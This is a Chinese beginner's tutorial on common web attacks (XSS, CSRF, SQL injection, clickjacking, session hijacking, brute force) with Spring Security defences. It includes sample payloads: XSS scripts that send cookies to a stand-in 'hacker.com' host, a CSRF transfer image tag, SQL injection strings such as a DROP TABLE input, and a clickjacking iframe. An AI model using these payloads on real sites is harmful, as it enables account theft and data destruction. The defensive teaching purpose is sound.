---
title: 1、常见攻击防护
---
## 📚 目录

1. [网络攻击基础认知](#1-网络攻击基础认知)
2. [XSS跨站脚本攻击](#2-XSS跨站脚本攻击)
3. [CSRF跨站请求伪造](#3-CSRF跨站请求伪造)
4. [SQL注入攻击](#4-SQL注入攻击)
5. [点击劫持攻击](#5-点击劫持攻击)
6. [会话劫持攻击](#6-会话劫持攻击)
7. [暴力破解攻击](#7-暴力破解攻击)
8. [综合防护策略](#8-综合防护策略)
9. [核心要点总结](#9-核心要点总结)

---

## 1. 🛡️ 网络攻击基础认知


### 1.1 什么是网络攻击


**通俗理解**：就像现实中的小偷、骗子一样，网络攻击者会用各种"套路"来窃取你的信息或破坏你的系统。

```
现实类比：
小偷入室盗窃 → SQL注入攻击（直接闯入数据库）
电话诈骗     → XSS攻击（伪装成可信内容）
冒充身份     → CSRF攻击（冒用你的身份做坏事）
偷窥密码     → 会话劫持（偷看你的登录状态）
```

### 1.2 为什么要学习安全防护


**🎯 核心原因**：
- 💰 **保护用户数据** - 防止个人信息泄露
- 🔒 **保障系统稳定** - 避免服务被恶意破坏
- ⚖️ **符合法律要求** - 满足数据安全法规
- 🏆 **提升专业能力** - 成为靠谱的开发者

### 1.3 常见攻击类型一览


| 攻击类型 | 通俗说法 | 危害程度 | 防护难度 |
|---------|---------|---------|---------|
| **XSS** | 网页投毒 | ⭐⭐⭐⭐ | ⭐⭐⭐ |
| **CSRF** | 身份冒用 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| **SQL注入** | 数据库入侵 | ⭐⭐⭐⭐⭐ | ⭐⭐ |
| **点击劫持** | 视觉欺骗 | ⭐⭐⭐ | ⭐⭐ |
| **会话劫持** | 偷取令牌 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| **暴力破解** | 疯狂试密码 | ⭐⭐⭐ | ⭐ |

---

## 2. 🎭 XSS跨站脚本攻击


### 2.1 XSS是什么


**新人理解**：想象你在论坛发帖，黑客在帖子里"下毒"（插入恶意脚本），别人看帖子时就会中招。

```
攻击过程：
用户A发帖 → 插入恶意代码 → 保存到数据库
               ↓
用户B浏览帖子 → 恶意代码执行 → 窃取B的Cookie
```

**🔍 实际案例**：
```javascript
// 黑客在评论框输入：
<script>
  // 偷取用户Cookie发送到黑客服务器
  fetch('http://hacker.com/steal?cookie=' + document.cookie);
</script>

// 当其他用户查看这条评论时，脚本就会执行！
```

### 2.2 XSS攻击类型


**📋 三种主要类型**：

```
类型1: 存储型XSS（最危险）
┌─────────┐    存储恶意脚本    ┌─────────┐
│ 攻击者  │ ───────────────→  │ 数据库  │
└─────────┘                    └─────────┘
                                    ↓
                              其他用户访问时触发

类型2: 反射型XSS（一次性）
攻击者 → 构造恶意链接 → 发送给受害者 → 点击后中招

类型3: DOM型XSS（前端漏洞）
浏览器端直接处理恶意输入 → 不经过服务器
```

### 2.3 防护方法


**✅ 核心防护原则**：**永远不要相信用户输入！**

**🛡️ 防护策略**：

| 防护方式 | 原理 | 适用场景 |
|---------|------|---------|
| **输入过滤** | 清除危险字符 | 表单提交 |
| **输出编码** | 转义特殊符号 | 页面显示 |
| **CSP策略** | 限制脚本来源 | 整站防护 |
| **HttpOnly Cookie** | 禁止JS访问Cookie | 会话保护 |

**💻 Spring Security配置**：

```java
// 1. 输出时进行HTML转义
public String safeDisplay(String userInput) {
    return HtmlUtils.htmlEscape(userInput);
    // 将 <script> 转为 &lt;script&gt;
}

// 2. 配置CSP响应头
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers()
            .contentSecurityPolicy(
                "script-src 'self'"  // 只允许本站脚本
            );
        return http.build();
    }
}
```

> 💡 **新人提示**  
> 记住口诀：**输入过滤，输出转义，Cookie标记HttpOnly**

---

## 3. 🎣 CSRF跨站请求伪造


### 3.1 CSRF是什么


**生活类比**：你登录了网银（已认证），然后访问了黑客网站，黑客网站偷偷用你的身份给黑客转账！

```
攻击流程：
第1步：你登录银行网站 → 获得登录凭证（Cookie）
第2步：你访问黑客网站 → 黑客网站藏有恶意请求
第3步：浏览器自动带上Cookie → 以你的身份发起转账请求
第4步：银行以为是你操作 → 转账成功！
```

**🎯 关键点**：浏览器会**自动携带Cookie**，这是CSRF的核心漏洞！

### 3.2 攻击示例


**🔍 实际案例**：

```html
<!-- 黑客网站的恶意代码 -->
<img src="http://bank.com/transfer?to=hacker&amount=10000" />

<!-- 
当你访问黑客网站时：
1. 浏览器加载这个图片
2. 自动发送请求到bank.com
3. 自动带上你的银行Cookie
4. 银行误以为是你本人操作
-->
```

### 3.3 防护方法


**🛡️ 防护核心**：验证请求的**真实来源**

**✅ 主流防护方案**：

```
方案对比：
┌──────────────┬──────────────┬──────────────┐
│  CSRF Token  │  Same-Site   │  Double Cookie│
│  (最常用)     │  Cookie      │  Submit       │
├──────────────┼──────────────┼──────────────┤
│ 服务器生成   │ 浏览器限制   │ Cookie+Header │
│ 随机令牌     │ Cookie发送   │ 双重验证     │
│ 表单隐藏字段 │ 范围         │              │
└──────────────┴──────────────┴──────────────┘
```

**💻 Spring Security自动防护**：

```java
@Configuration
public class CsrfConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http
            // Spring Security默认开启CSRF防护
            .csrf(csrf -> csrf
                .csrfTokenRepository(
                    CookieCsrfTokenRepository.withHttpOnlyFalse()
                )
            );
        return http.build();
    }
}

// 前端表单需要包含Token
// <input type="hidden" name="_csrf" value="${_csrf.token}" />
```

**🔧 工作原理**：

```
请求流程：
1. 访问表单页面 → 服务器生成CSRF Token
2. Token放入表单 → <input name="_csrf" value="abc123">
3. 提交表单 → 同时提交Token
4. 服务器验证 → Token匹配才处理请求

黑客无法获取Token → 伪造请求失败！
```

> ⚠️ **重要提醒**  
> GET请求不要做修改操作（转账、删除等），只用POST/PUT/DELETE

---

## 4. 💉 SQL注入攻击


### 4.1 SQL注入是什么


**新人理解**：就像你问机器人"今天天气怎么样"，黑客问"今天天气怎么样；把所有数据都给我"。

```
正常查询：
用户输入: admin
SQL语句: SELECT * FROM users WHERE username = 'admin'

注入攻击：
用户输入: admin' OR '1'='1
SQL语句: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
结果: 返回所有用户数据！（'1'='1' 永远为真）
```

### 4.2 攻击威力演示


**🔥 危险案例**：

| 输入内容 | 实际执行SQL | 后果 |
|---------|------------|------|
| `' OR 1=1--` | `WHERE id='' OR 1=1--` | 绕过验证 |
| `'; DROP TABLE users--` | 执行删表语句 | 数据全毁 |
| `' UNION SELECT password--` | 合并查询密码 | 数据泄露 |

**🎯 攻击流程图**：

```
攻击者
  ↓
输入恶意SQL片段
  ↓
拼接到查询语句
  ↓
数据库执行
  ↓
🔴 数据泄露/破坏
```

### 4.3 防护方法


**✅ 黄金法则**：**永远使用参数化查询**

**🛡️ 防护对比**：

```java
// ❌ 危险写法（字符串拼接）
String sql = "SELECT * FROM users WHERE name = '" + userName + "'";
// 黑客输入：admin' OR '1'='1
// 实际执行：SELECT * FROM users WHERE name = 'admin' OR '1'='1'

// ✅ 安全写法（预编译）
String sql = "SELECT * FROM users WHERE name = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, userName);  // 自动转义特殊字符
```

**💻 MyBatis Plus安全实践**：

```java
// ✅ 推荐：使用#{}参数化
@Select("SELECT * FROM users WHERE name = #{name}")
User findByName(String name);

// ❌ 危险：使用${}拼接（仅用于表名、列名等）
@Select("SELECT * FROM users WHERE name = '${name}'")
User dangerousFind(String name);
```

**📋 完整防护清单**：

- [x] 使用PreparedStatement或ORM框架
- [x] 输入验证（长度、格式、白名单）
- [x] 最小权限原则（数据库用户权限限制）
- [x] 错误信息不暴露SQL语句
- [x] 定期安全审计

> 💡 **记忆口诀**  
> **参数化查询保平安，字符串拼接是祸端**

---

## 5. 🖱️ 点击劫持攻击


### 5.1 点击劫持是什么


**生活类比**：就像变魔术的"障眼法"，你以为点的是A按钮，实际点的是B按钮。

```
视觉欺骗：
┌─────────────────┐
│  看到：抽奖按钮  │  ← 透明度100%
├─────────────────┤
│  实际：转账按钮  │  ← 透明度0%（隐藏）
└─────────────────┘
用户点击"抽奖" → 实际触发"转账"
```

### 5.2 攻击原理


**🎯 技术实现**：

```html
<!-- 黑客网站代码 -->
<style>
  #hacker-iframe {
    position: absolute;
    opacity: 0;  /* 完全透明 */
    z-index: 9999;
  }
</style>

<iframe id="hacker-iframe" src="http://bank.com/transfer">
</iframe>

<button>点击领取奖品</button>  <!-- 诱饵按钮 -->
```

**攻击流程**：
```
1. 黑客创建透明iframe加载银行网站
2. 在iframe上方放置诱饵按钮
3. 用户以为点击"领奖"
4. 实际点击了银行的"转账"按钮
```

### 5.3 防护方法


**🛡️ 核心策略**：禁止网页被嵌入iframe

**✅ X-Frame-Options响应头**：

```java
@Configuration
public class FrameOptionsConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers()
            .frameOptions()
            .deny();  // 完全禁止被iframe嵌入
            
        // 或者只允许同源嵌入
        // .sameOrigin()
        
        return http.build();
    }
}
```

**📊 防护选项对比**：

| 配置 | 效果 | 使用场景 |
|------|------|---------|
| `DENY` | 任何网站都不能嵌入 | 高安全要求 |
| `SAMEORIGIN` | 只允许同域名嵌入 | 自己网站需要iframe |
| `ALLOW-FROM uri` | 允许指定网站嵌入 | 第三方合作 |

> ⚠️ **注意事项**  
> 如果你的网站需要被其他网站嵌入（如支付插件），需要谨慎配置

---

## 6. 🕵️ 会话劫持攻击


### 6.1 会话劫持是什么


**通俗理解**：你登录后，系统给你一个"通行证"（Session ID），黑客偷走通行证假冒你。

```
正常流程：
你登录 → 获得Session ID → 凭ID访问系统

劫持流程：
你登录 → 获得Session ID → 黑客窃取ID → 黑客假冒你
```

### 6.2 窃取方式


**🔍 常见窃取手段**：

```
窃取途径：
┌─────────────┐
│  XSS攻击    │ → 通过脚本窃取Cookie
├─────────────┤
│  网络嗅探    │ → 抓取HTTP数据包（未加密）
├─────────────┤
│  中间人攻击  │ → 在WiFi路由器截获数据
├─────────────┤
│  Session预测 │ → 猜测Session ID规律
└─────────────┘
```

**🎯 攻击演示**：

```javascript
// 通过XSS窃取Cookie中的Session ID
<script>
  var sessionId = document.cookie.match(/JSESSIONID=([^;]+)/)[1];
  fetch('http://hacker.com/steal?id=' + sessionId);
</script>
```

### 6.3 防护方法


**🛡️ 多层防护策略**：

**✅ 防护清单**：

- [x] **使用HTTPS** - 加密传输，防止嗅探
- [x] **HttpOnly Cookie** - 禁止JS访问Cookie
- [x] **Secure Cookie** - 仅HTTPS传输
- [x] **Session超时** - 限制有效时间
- [x] **IP绑定** - 绑定用户IP地址
- [x] **定期刷新** - 定期更换Session ID

**💻 Spring Security配置**：

```java
@Configuration
public class SessionConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http
            // Session管理
            .sessionManagement(session -> session
                // Session固定攻击防护
                .sessionFixation().migrateSession()
                // 最大会话数
                .maximumSessions(1)
                // 阻止新登录
                .maxSessionsPreventsLogin(true)
            )
            // Cookie安全设置
            .headers(headers -> headers
                .httpStrictTransportSecurity()  // 强制HTTPS
            );
            
        return http.build();
    }
}

// application.yml配置
server:
  servlet:
    session:
      timeout: 30m  # 30分钟超时
      cookie:
        http-only: true  # 禁止JS访问
        secure: true     # 仅HTTPS传输
```

**🔒 高级防护**：

```java
// 登录成功后更换Session ID
public void onLoginSuccess(HttpServletRequest request) {
    HttpSession oldSession = request.getSession(false);
    if (oldSession != null) {
        oldSession.invalidate();  // 销毁旧Session
    }
    HttpSession newSession = request.getSession(true);  // 创建新Session
}
```

> 💡 **安全提示**  
> 敏感操作（如转账）需要二次验证，不能只依赖Session

---

## 7. 🔓 暴力破解攻击


### 7.1 暴力破解是什么


**新人理解**：就像小偷试密码锁，从0000试到9999，总能试出来。

```
攻击过程：
尝试 admin/123456 → 失败
尝试 admin/password → 失败  
尝试 admin/123123 → 失败
...
尝试 admin/abc123 → 成功！
```

### 7.2 攻击特征


**📊 识别特征**：

| 特征 | 正常用户 | 暴力攻击 |
|------|---------|---------|
| **登录频率** | 偶尔登录 | 每秒数十次 |
| **失败次数** | 1-2次 | 成百上千次 |
| **用户名** | 固定 | 批量尝试 |
| **IP地址** | 相对固定 | 可能分布式 |

**🎯 攻击类型**：

```
类型1: 字典攻击
使用常用密码列表（123456, password等）

类型2: 暴力穷举
尝试所有可能组合（a-z, 0-9组合）

类型3: 分布式攻击
使用多个IP分散请求，绕过单IP限制
```

### 7.3 防护方法


**🛡️ 防护策略金字塔**：

```
         ┌──────────────┐
         │ 强制双因素认证 │ ← 最安全
         ├──────────────┤
         │  验证码验证    │
         ├──────────────┤
         │  账户临时锁定  │
         ├──────────────┤
         │  登录频率限制  │ ← 基础防护
         └──────────────┘
```

**✅ 实战防护方案**：

**方案1: 登录失败锁定**

```java
@Service
public class LoginAttemptService {
    
    private final Map<String, Integer> attemptsCache = new ConcurrentHashMap<>();
    
    private static final int MAX_ATTEMPTS = 5;  // 最大尝试次数
    
    public void loginFailed(String username) {
        int attempts = attemptsCache.getOrDefault(username, 0);
        attemptsCache.put(username, attempts + 1);
    }
    
    public boolean isBlocked(String username) {
        return attemptsCache.getOrDefault(username, 0) >= MAX_ATTEMPTS;
    }
    
    public void loginSuccess(String username) {
        attemptsCache.remove(username);  // 清除失败记录
    }
}
```

**方案2: 频率限制**

```java
@Component
public class RateLimitFilter extends OncePerRequestFilter {
    
    // 使用Guava的RateLimiter
    private final RateLimiter rateLimiter = RateLimiter.create(5.0);  // 每秒5次
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                    HttpServletResponse response, 
                                    FilterChain chain) {
        if (!rateLimiter.tryAcquire()) {
            response.setStatus(429);  // Too Many Requests
            return;
        }
        chain.doFilter(request, response);
    }
}
```

**方案3: 验证码（推荐）**

```java
// 失败3次后要求验证码
if (failCount >= 3) {
    // 显示验证码
    model.addAttribute("needCaptcha", true);
}
```

**📋 完整防护检查表**：

- [x] 限制登录失败次数（5次）
- [x] 失败后延迟响应（逐渐增加）
- [x] 添加图形验证码
- [x] 监控异常登录（IP、时间、频率）
- [x] 强制密码复杂度要求
- [x] 实施双因素认证

> ⚠️ **防护平衡**  
> 防护措施不能影响正常用户体验，比如不能一次失败就锁定

---

## 8. 🔐 综合防护策略


### 8.1 安全防护体系


**🏗️ 纵深防御架构**：

```
防护层次：
┌─────────────────────────────────┐
│      应用层防护（代码安全）        │ ← XSS、SQL注入防护
├─────────────────────────────────┤
│      会话层防护（认证授权）        │ ← CSRF、会话劫持防护
├─────────────────────────────────┤
│      传输层防护（网络安全）        │ ← HTTPS、加密传输
├─────────────────────────────────┤
│      基础设施防护（系统安全）      │ ← 防火墙、入侵检测
└─────────────────────────────────┘
```

### 8.2 Spring Security集成配置


**💻 完整安全配置**：

```java
@Configuration
@EnableWebSecurity
public class ComprehensiveSecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // 1. 认证配置
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .anyRequest().authenticated()
            )
            
            // 2. CSRF防护
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            )
            
            // 3. 点击劫持防护
            .headers(headers -> headers
                .frameOptions().deny()
                .contentSecurityPolicy("script-src 'self'")
            )
            
            // 4. 会话管理
            .sessionManagement(session -> session
                .sessionFixation().migrateSession()
                .maximumSessions(1)
            )
            
            // 5. HTTPS强制
            .requiresChannel(channel -> channel
                .anyRequest().requiresSecure()
            );
            
        return http.build();
    }
}
```

### 8.3 安全检查清单


**📋 开发阶段检查**：

- [ ] **输入验证** - 所有用户输入都验证
- [ ] **输出编码** - 显示内容都转义
- [ ] **参数化查询** - 杜绝SQL拼接
- [ ] **HTTPS部署** - 生产环境强制
- [ ] **密码加密** - BCrypt加密存储
- [ ] **敏感数据** - 脱敏处理
- [ ] **错误处理** - 不暴露敏感信息

**🔍 测试阶段检查**：

- [ ] **安全扫描** - 使用OWASP ZAP扫描
- [ ] **渗透测试** - 模拟攻击测试
- [ ] **代码审计** - 安全代码审查
- [ ] **依赖检查** - 检查已知漏洞

**🚀 部署阶段检查**：

- [ ] **防火墙配置** - 限制端口开放
- [ ] **访问日志** - 记录所有访问
- [ ] **监控告警** - 异常行为报警
- [ ] **定期更新** - 及时修补漏洞

### 8.4 安全工具推荐


| 工具类型 | 推荐工具 | 用途 |
|---------|---------|------|
| **漏洞扫描** | OWASP ZAP、Burp Suite | 发现安全漏洞 |
| **代码审计** | SonarQube、Checkmarx | 静态代码分析 |
| **依赖检查** | OWASP Dependency Check | 第三方库漏洞 |
| **渗透测试** | Metasploit、Kali Linux | 模拟攻击 |
| **监控告警** | ELK、Prometheus | 实时监控 |

---

## 9. 📋 核心要点总结


### 9.1 必须掌握的防护要点


```
🔸 XSS防护：输入过滤 + 输出转义 + CSP策略
🔸 CSRF防护：Token验证 + SameSite Cookie
🔸 SQL注入：参数化查询 + 输入验证
🔸 点击劫持：X-Frame-Options响应头
🔸 会话劫持：HTTPS + HttpOnly + 定期刷新
🔸 暴力破解：失败锁定 + 验证码 + 频率限制
```

### 9.2 安全开发黄金法则


> 💎 **永远不要信任用户输入**

**🎯 核心原则**：
1. **输入验证** - 白名单优于黑名单
2. **最小权限** - 只给必需的权限
3. **纵深防御** - 多层防护措施
4. **安全默认** - 默认拒绝访问
5. **持续监控** - 实时检测异常

### 9.3 记忆口诀


```
🧠 安全防护记忆诀：

输入验证别偷懒，输出转义要记牢
参数查询防注入，Token机制挡CSRF
HTTPS加密保传输，Session管理要严格
验证码来防暴力，日志监控不能少
```

### 9.4 实战建议


**🎓 新人学习路径**：
```
第1阶段：理解攻击原理（知己知彼）
   ↓
第2阶段：掌握防护方法（对症下药）
   ↓
第3阶段：实践配置应用（动手实战）
   ↓
第4阶段：持续学习进化（永不停歇）
```

**⭐ 优先级排序**：
1. **🔥 高优先级** - SQL注入、XSS、CSRF（必须防护）
2. **⚡ 中优先级** - 会话劫持、点击劫持（重点关注）
3. **💡 低优先级** - 暴力破解（根据业务决定）

---

> 🎯 **学习检查点**
> - [x] 理解六大攻击类型的原理
> - [x] 掌握对应的防护方法
> - [x] 会使用Spring Security配置防护
> - [x] 知道如何进行安全测试
> - [x] 建立安全开发意识

**💪 下一步行动**：
1. 在自己项目中逐项实施防护
2. 使用安全扫描工具检测漏洞
3. 定期关注最新安全资讯
4. 参与安全社区讨论交流